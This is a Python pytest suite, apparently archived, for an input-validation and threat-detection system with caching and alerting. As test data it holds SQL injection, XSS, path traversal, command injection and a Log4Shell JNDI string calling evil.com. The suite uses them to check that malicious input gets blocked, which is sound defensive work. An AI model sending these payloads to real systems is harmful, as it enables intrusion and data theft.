"""
Comprehensive test suite for advanced validation system.
Tests AI-powered threat detection, performance optimization, and edge cases.
"""

import pytest

pytest.skip(
    "Legacy test archived; superseded by canonical test suite.", allow_module_level=True
)

import asyncio
import json
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List
from unittest.mock import AsyncMock, Mock, patch

import pytest

from .core.advanced_validation import (
    AdvancedValidator,
    ThreatCategory,
    ThreatIndicator,
    ThreatIntelligence,
    ThreatLevel,
    ThreatSeverity,
    ValidationMode,
    ValidationResult,
)
from .core.health_analytics import AlertRule, AlertSeverity, AlertType, HealthAnalytics
from .core.threat_intelligence import AttackPattern, ThreatEvent, ThreatSource
from .core.validation_performance import (
    AdaptiveCache,
    PerformanceLevel,
    ValidationOptimizer,
)


class TestAdvancedValidator:
    """Test suite for AdvancedValidator."""

    @pytest.fixture
    def validator(self):
        """Create validator instance for testing."""
        return AdvancedValidator(ValidationMode.BALANCED)

    @pytest.fixture
    def sample_request(self):
        """Sample request data for testing."""
        return {
            "request": "Test request with normal content",
            "user_id": "test_user_123",
            "workspace_id": "test_workspace_456",
            "session_id": "test_session_789",
        }

    @pytest.fixture
    def malicious_request(self):
        """Malicious request data for testing."""
        return {
            "request": "'; DROP TABLE users; --",
            "user_id": "test_user_123",
            "workspace_id": "test_workspace_456",
            "session_id": "test_session_789",
        }

    @pytest.mark.asyncio
    async def test_validate_normal_request(self, validator, sample_request):
        """Test validation of normal request."""
        result = await validator.validate_request(sample_request)

        assert result.is_valid is True
        assert result.threat_level == ThreatLevel.LOW
        assert result.confidence > 0.5
        assert len(result.threats_detected) == 0
        assert result.risk_score < 0.5
        assert result.processing_time > 0
        assert isinstance(result.recommendations, list)
        assert isinstance(result.metadata, dict)

    @pytest.mark.asyncio
    async def test_validate_malicious_request(self, validator, malicious_request):
        """Test validation of malicious request."""
        result = await validator.validate_request(malicious_request)

        assert result.is_valid is False
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
        assert result.confidence > 0.8
        assert len(result.threats_detected) > 0
        assert result.risk_score > 0.7
        assert any(
            "injection" in threat.get("attack_type", "").lower()
            for threat in result.threats_detected
        )

    @pytest.mark.asyncio
    async def test_validation_caching(self, validator, sample_request):
        """Test validation caching functionality."""
        # First validation
        start_time = time.time()
        result1 = await validator.validate_request(sample_request)
        first_time = time.time() - start_time

        # Second validation (should use cache)
        start_time = time.time()
        result2 = await validator.validate_request(sample_request)
        second_time = time.time() - start_time

        # Results should be identical
        assert result1.is_valid == result2.is_valid
        assert result1.threat_level == result2.threat_level
        assert result1.risk_score == result2.risk_score

        # Second validation should be faster (cache hit)
        assert second_time < first_time

    @pytest.mark.asyncio
    async def test_validation_modes(self, sample_request):
        """Test different validation modes."""
        strict_validator = AdvancedValidator(ValidationMode.STRICT)
        permissive_validator = AdvancedValidator(ValidationMode.PERMISSIVE)

        strict_result = await strict_validator.validate_request(sample_request)
        permissive_result = await permissive_validator.validate_request(sample_request)

        # Strict mode should have lower threshold
        assert (
            strict_validator._get_mode_threshold()
            < permissive_validator._get_mode_threshold()
        )

    @pytest.mark.asyncio
    async def test_feature_extraction(self, validator, sample_request):
        """Test feature extraction for ML analysis."""
        features = validator._extract_features(sample_request, {})

        assert isinstance(features, list)
        assert len(features) > 0
        assert all(isinstance(f, (int, float)) for f in features)

    @pytest.mark.asyncio
    async def test_risk_score_calculation(self, validator):
        """Test risk score calculation."""
        # Test with no threats
        risk_score = validator._calculate_risk_score([], [], False, {})
        assert 0 <= risk_score <= 1

        # Test with threats
        threats = [
            {"severity": "high", "confidence": 0.9},
            {"severity": "medium", "confidence": 0.7},
        ]
        risk_score = validator._calculate_risk_score(
            threats, [1.0, 2.0, 3.0], False, {}
        )
        assert risk_score > 0.5

    def test_metrics_tracking(self, validator):
        """Test metrics tracking functionality."""
        initial_metrics = validator.get_metrics()
        assert initial_metrics.total_requests >= 0

        # Simulate some requests
        validator._update_metrics(
            ValidationResult(
                is_valid=True,
                threat_level=ThreatLevel.LOW,
                confidence=0.8,
                threats_detected=[],
                risk_score=0.2,
                processing_time=0.1,
                recommendations=[],
                metadata={},
            )
        )

        updated_metrics = validator.get_metrics()
        assert updated_metrics.total_requests > initial_metrics.total_requests


class TestThreatIntelligence:
    """Test suite for ThreatIntelligence system."""

    @pytest.fixture
    def threat_intel(self):
        """Create threat intelligence instance."""
        return ThreatIntelligence()

    @pytest.fixture
    def sample_threats(self):
        """Sample threat indicators for testing."""
        return [
            ThreatIndicator(
                id="test_1",
                type="ip",
                value="192.168.1.100",
                category=ThreatCategory.RECONNAISSANCE,
                severity=ThreatSeverity.MEDIUM,
                confidence=0.8,
                source=ThreatSource.THREAT_FEEDS,
                description="Test IP indicator",
                first_seen=datetime.now(),
                last_seen=datetime.now(),
                count=1,
            ),
            ThreatIndicator(
                id="test_2",
                type="pattern",
                value="<script>alert('xss')</script>",
                category=ThreatCategory.XSS,
                severity=ThreatSeverity.HIGH,
                confidence=0.95,
                source=ThreatSource.MACHINE_LEARNING,
                description="XSS pattern",
                first_seen=datetime.now(),
                last_seen=datetime.now(),
                count=1,
            ),
        ]

    @pytest.mark.asyncio
    async def test_pattern_detection(self, threat_intel):
        """Test threat pattern detection."""
        request_data = {
            "request": "'; SELECT * FROM users WHERE '1'='1",
            "user_id": "test_user",
        }

        threats = await threat_intel.analyze_request(request_data)

        assert len(threats) > 0
        assert any(threat.category == ThreatCategory.INJECTION for threat in threats)
        assert all(threat.confidence > 0.5 for threat in threats)

    @pytest.mark.asyncio
    async def test_indicator_detection(self, threat_intel):
        """Test threat indicator detection."""
        # Add malicious IP to threat feeds
        threat_intel.threat_feeds.feed_data["malicious_ips"] = {"192.168.1.100"}

        request_data = {"request": "test request"}
        source_ip = "192.168.1.100"

        threats = await threat_intel.analyze_request(request_data, source_ip=source_ip)

        assert len(threats) > 0
        assert any(threat.source_ip == source_ip for threat in threats)

    @pytest.mark.asyncio
    async def test_behavioral_analysis(self, threat_intel):
        """Test behavioral threat analysis."""
        user_id = "test_user"

        # Simulate multiple requests from same user
        for i in range(150):  # Exceed threshold
            request_data = {"request": f"test request {i}"}
            await threat_intel.analyze_request(request_data, user_id=user_id)

        # Next request should trigger behavioral alert
        request_data = {"request": "another test request"}
        threats = await threat_intel.analyze_request(request_data, user_id=user_id)

        assert any(
            threat.category == ThreatCategory.DENIAL_OF_SERVICE for threat in threats
        )

    def test_threat_clustering(self, threat_intel):
        """Test threat clustering functionality."""
        # Create similar threat events
        threats = [
            ThreatEvent(
                id=f"threat_{i}",
                timestamp=datetime.now(),
                indicator_id="pattern_1",
                source_ip="192.168.1.1",
                user_id="user_1",
                workspace_id="workspace_1",
                request_data={"request": f"test {i}"},
                severity=ThreatSeverity.MEDIUM,
                category=ThreatCategory.INJECTION,
                description="Test threat",
                blocked=False,
                action_taken=None,
                metadata={},
            )
            for i in range(10)
        ]

        clusters = threat_intel.clustering.cluster_threats(threats)

        assert len(clusters) >= 1
        assert all(isinstance(cluster_id, int) for cluster_id in clusters.keys())
        assert all(isinstance(threat_list, list) for threat_list in clusters.values())

    def test_threat_summary(self, threat_intel):
        """Test threat summary generation."""
        # Add some sample events
        for i in range(5):
            threat_intel.events.append(
                ThreatEvent(
                    id=f"threat_{i}",
                    timestamp=datetime.now() - timedelta(hours=i),
                    indicator_id="test",
                    source_ip="192.168.1.1",
                    user_id="user_1",
                    workspace_id="workspace_1",
                    request_data={"request": "test"},
                    severity=ThreatSeverity.MEDIUM,
                    category=ThreatCategory.INJECTION,
                    description="Test threat",
                    blocked=False,
                    action_taken=None,
                    metadata={},
                )
            )

        summary = threat_intel.get_threat_summary(24)

        assert "total_threats" in summary
        assert "blocked_threats" in summary
        assert "category_distribution" in summary
        assert "severity_distribution" in summary
        assert summary["total_threats"] == 5


class TestValidationPerformance:
    """Test suite for validation performance optimization."""

    @pytest.fixture
    def optimizer(self):
        """Create validation optimizer."""
        return ValidationOptimizer(PerformanceLevel.BALANCED)

    @pytest.fixture
    def cache(self):
        """Create adaptive cache."""
        return AdaptiveCache(max_size=100)

    @pytest.mark.asyncio
    async def test_cache_operations(self, cache):
        """Test basic cache operations."""
        request_data = {"request": "test request"}
        value = {"valid": True, "confidence": 0.9}

        # Test cache miss
        result = await cache.get(request_data)
        assert result is None

        # Test cache set
        await cache.set(request_data, value)

        # Test cache hit
        result = await cache.get(request_data)
        assert result == value

        # Test cache stats
        stats = cache.get_performance_report()
        assert stats["hit_rate"] > 0
        assert stats["total_requests"] == 2
        assert stats["cache_size"] == 1

    @pytest.mark.asyncio
    async def test_cache_eviction(self, cache):
        """Test cache eviction policies."""
        # Fill cache beyond capacity
        for i in range(150):  # Exceed max_size of 100
            request_data = {"request": f"test {i}"}
            value = {"valid": True, "index": i}
            await cache.set(request_data, value)

        stats = cache.get_performance_report()
        assert stats["cache_size"] <= 100
        assert stats["evictions"] > 0

    @pytest.mark.asyncio
    async def test_validation_with_optimization(self, optimizer):
        """Test validation with performance optimization."""
        request_data = {"request": "test request"}

        async def mock_validation(request_data, context):
            return {"valid": True, "confidence": 0.9}

        # First call (cache miss)
        result1, cache_hit1 = await optimizer.validate_with_cache(
            request_data, mock_validation
        )
        assert cache_hit1 is False
        assert result1["valid"] is True

        # Second call (cache hit)
        result2, cache_hit2 = await optimizer.validate_with_cache(
            request_data, mock_validation
        )
        assert cache_hit2 is True
        assert result2 == result1

    def test_performance_levels(self):
        """Test different performance levels."""
        ultra_fast = ValidationOptimizer(PerformanceLevel.ULTRA_FAST)
        paranoid = ValidationOptimizer(PerformanceLevel.PARANOID)

        ultra_fast_threshold = ultra_fast.validation_thresholds[
            PerformanceLevel.ULTRA_FAST
        ]
        paranoid_threshold = paranoid.validation_thresholds[PerformanceLevel.PARANOID]

        # Ultra-fast should have higher cache hit rate target
        assert (
            ultra_fast_threshold["cache_hit_rate"]
            > paranoid_threshold["cache_hit_rate"]
        )

        # Paranoid should allow more validation time
        assert (
            paranoid_threshold["max_validation_time"]
            > ultra_fast_threshold["max_validation_time"]
        )

    @pytest.mark.asyncio
    async def test_ttl_calculation(self, optimizer):
        """Test TTL calculation based on context."""
        # Trusted user context
        trusted_context = {"user_trust_score": 0.9}
        ttl_trusted = optimizer._calculate_ttl({}, trusted_context)

        # Untrusted user context
        untrusted_context = {"user_trust_score": 0.2}
        ttl_untrusted = optimizer._calculate_ttl({}, untrusted_context)

        # Trusted user should get longer TTL
        assert ttl_trusted > ttl_untrusted


class TestHealthAnalytics:
    """Test suite for health analytics and alerting."""

    @pytest.fixture
    def analytics(self):
        """Create health analytics instance."""
        return HealthAnalytics()

    @pytest.mark.asyncio
    async def test_metric_processing(self, analytics):
        """Test health metric processing."""
        await analytics.process_metric("cpu_usage", 75.5)

        assert "cpu_usage" in analytics.metric_history
        assert len(analytics.metric_history["cpu_usage"]) == 1
        assert analytics.metric_history["cpu_usage"][0]["value"] == 75.5

    @pytest.mark.asyncio
    async def test_alert_rule_evaluation(self, analytics):
        """Test alert rule evaluation."""
        # Create test rule
        rule = AlertRule(
            id="test_rule",
            name="Test Rule",
            description="Test alert rule",
            metric_pattern="cpu_usage",
            condition="gt",
            threshold=80.0,
            severity=AlertSeverity.WARNING,
            enabled=True,
            notification_channels=[],
        )
        analytics.add_alert_rule(rule)

        # Process metric that should trigger alert
        await analytics.process_metric("cpu_usage", 85.0)

        # Check if alert was generated
        active_alerts = analytics.get_active_alerts()
        assert len(active_alerts) > 0
        assert any(alert.metric_name == "cpu_usage" for alert in active_alerts)

    @pytest.mark.asyncio
    async def test_alert_acknowledgment(self, analytics):
        """Test alert acknowledgment."""
        # Create a test alert
        alert = analytics.alerts["test_alert"] = Mock(
            id="test_alert",
            status=AlertStatus.ACTIVE,
            acknowledged_at=None,
            acknowledged_by=None,
        )

        # Acknowledge alert
        await analytics.acknowledge_alert("test_alert", "test_user")

        assert alert.status == AlertStatus.ACKNOWLEDGED
        assert alert.acknowledged_by == "test_user"
        assert alert.acknowledged_at is not None

    @pytest.mark.asyncio
    async def test_anomaly_detection(self, analytics):
        """Test anomaly detection in metrics."""
        # Generate normal metrics
        for i in range(50):
            await analytics.process_metric("test_metric", 50.0 + (i % 10))

        # Generate anomalous metric
        await analytics.process_metric("test_metric", 200.0)

        # Check if anomaly was detected (this would need actual implementation)
        # For now, just test that the system doesn't crash
        assert "test_metric" in analytics.metric_history

    def test_alert_summary(self, analytics):
        """Test alert summary generation."""
        # Add sample alerts
        now = datetime.now()
        for i in range(5):
            analytics.alert_history.append(
                Mock(
                    timestamp=now - timedelta(hours=i),
                    severity=(
                        AlertSeverity.WARNING if i % 2 == 0 else AlertSeverity.ERROR
                    ),
                    status=AlertStatus.ACTIVE,
                    alert_type=AlertType.THRESHOLD_EXCEEDED,
                )
            )

        summary = analytics.get_alert_summary(24)

        assert "total_alerts" in summary
        assert "severity_distribution" in summary
        assert "type_distribution" in summary
        assert summary["total_alerts"] == 5


class TestIntegrationScenarios:
    """Integration tests for complete validation and health monitoring scenarios."""

    @pytest.mark.asyncio
    async def test_end_to_end_validation_flow(self):
        """Test complete validation flow with all components."""
        # Setup components
        validator = AdvancedValidator(ValidationMode.BALANCED)
        threat_intel = ThreatIntelligence()
        optimizer = ValidationOptimizer(PerformanceLevel.BALANCED)

        # Test request
        request_data = {
            "request": "Normal user request",
            "user_id": "integration_test_user",
            "workspace_id": "test_workspace",
        }

        # Perform validation
        validation_result = await validator.validate_request(request_data)

        # Perform threat analysis
        threats = await threat_intel.analyze_request(request_data)

        # Test optimized validation
        async def mock_validation(data, context):
            return validation_result

        optimized_result, cache_hit = await optimizer.validate_with_cache(
            request_data, mock_validation
        )

        # Assertions
        assert validation_result.is_valid is True
        assert len(threats) == 0  # Normal request should have no threats
        assert optimized_result == validation_result

        # Second call should use cache
        optimized_result2, cache_hit2 = await optimizer.validate_with_cache(
            request_data, mock_validation
        )
        assert cache_hit2 is True

    @pytest.mark.asyncio
    async def test_security_incident_scenario(self):
        """Test handling of security incident."""
        validator = AdvancedValidator(ValidationMode.STRICT)
        threat_intel = ThreatIntelligence()
        analytics = HealthAnalytics()

        # Simulate attack requests
        attack_requests = [
            {"request": "'; DROP TABLE users; --"},
            {"request": "<script>alert('xss')</script>"},
            {"request": "../../../etc/passwd"},
            {"request": "${jndi:ldap://evil.com/a}"},
        ]

        for i, req in enumerate(attack_requests):
            request_data = {
                "request": req["request"],
                "user_id": f"attacker_{i}",
                "source_ip": f"192.168.1.{100 + i}",
            }

            # Validate
            validation_result = await validator.validate_request(request_data)

            # Analyze threats
            threats = await threat_intel.analyze_request(
                request_data, source_ip=request_data["source_ip"]
            )

            # Process metrics for analytics
            await analytics.process_metric(
                "validation_risk_score", validation_result.risk_score
            )

            # All attack requests should be blocked
            assert validation_result.is_valid is False
            assert validation_result.risk_score > 0.7
            assert len(threats) > 0

    @pytest.mark.asyncio
    async def test_performance_under_load(self):
        """Test system performance under load."""
        validator = AdvancedValidator(ValidationMode.FAST)
        optimizer = ValidationOptimizer(PerformanceLevel.FAST)

        # Generate many requests
        requests = [
            {"request": f"Test request {i}", "user_id": f"user_{i % 100}"}
            for i in range(1000)
        ]

        start_time = time.time()

        # Process all requests
        async def mock_validation(data, context):
            return {"valid": True, "confidence": 0.9}

        tasks = [
            optimizer.validate_with_cache(req, mock_validation) for req in requests
        ]

        results = await asyncio.gather(*tasks)

        total_time = time.time() - start_time

        # Performance assertions
        assert len(results) == 1000
        assert total_time < 10.0  # Should complete within 10 seconds
        assert total_time / 1000 < 0.01  # Average < 10ms per request

        # Check cache performance
        metrics = optimizer.get_performance_metrics()
        assert metrics.cache_hit_rate > 0.5  # Should have good cache hit rate


# Test Data and Utilities
class TestDataGenerator:
    """Utility class for generating test data."""

    @staticmethod
    def generate_sql_injection_payloads():
        """Generate SQL injection test payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
        ]

    @staticmethod
    def generate_xss_payloads():
        """Generate XSS test payloads."""
        return [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
        ]

    @staticmethod
    def generate_path_traversal_payloads():
        """Generate path traversal test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/var/www/../../etc/passwd",
        ]

    @staticmethod
    def generate_command_injection_payloads():
        """Generate command injection test payloads."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "& echo 'command injection'",
            "`whoami`",
            "$(id)",
        ]


# Performance Benchmarks
class TestPerformanceBenchmarks:
    """Performance benchmark tests."""

    @pytest.mark.asyncio
    async def benchmark_validation_performance(self):
        """Benchmark validation performance."""
        validator = AdvancedValidator(ValidationMode.FAST)

        # Test data
        normal_requests = [{"request": f"Normal request {i}"} for i in range(100)]

        malicious_requests = [
            {"request": payload}
            for payload in TestDataGenerator.generate_sql_injection_payloads()
            for _ in range(20)
        ]

        # Benchmark normal requests
        start_time = time.time()
        for req in normal_requests:
            await validator.validate_request(req)
        normal_time = time.time() - start_time

        # Benchmark malicious requests
        start_time = time.time()
        for req in malicious_requests:
            await validator.validate_request(req)
        malicious_time = time.time() - start_time

        # Performance assertions
        assert normal_time / 100 < 0.01  # < 10ms per normal request
        assert malicious_time / 100 < 0.05  # < 50ms per malicious request

        print(f"Normal requests: {normal_time/100:.4f}s per request")
        print(f"Malicious requests: {malicious_time/100:.4f}s per request")

    @pytest.mark.asyncio
    async def benchmark_cache_performance(self):
        """Benchmark cache performance."""
        cache = AdaptiveCache(max_size=1000)

        # Test data
        requests = [
            {"request": f"Test request {i}", "data": "x" * 100} for i in range(1000)
        ]

        # Benchmark cache writes
        start_time = time.time()
        for i, req in enumerate(requests):
            await cache.set(req, f"value_{i}")
        write_time = time.time() - start_time

        # Benchmark cache reads
        start_time = time.time()
        for req in requests:
            await cache.get(req)
        read_time = time.time() - start_time

        # Performance assertions
        assert write_time / 1000 < 0.001  # < 1ms per write
        assert read_time / 1000 < 0.0005  # < 0.5ms per read

        stats = cache.get_performance_report()
        assert stats["hit_rate"] > 0.9  # Should have high hit rate

        print(f"Cache writes: {write_time/1000:.6f}s per operation")
        print(f"Cache reads: {read_time/1000:.6f}s per operation")
        print(f"Hit rate: {stats['hit_rate']:.2%}")


if __name__ == "__main__":
    # Run specific tests
    pytest.main(
        [
            __file__,
            "-v",
            "--tb=short",
            "-k",
            "test_validate_normal_request or test_validate_malicious_request",
        ]
    )
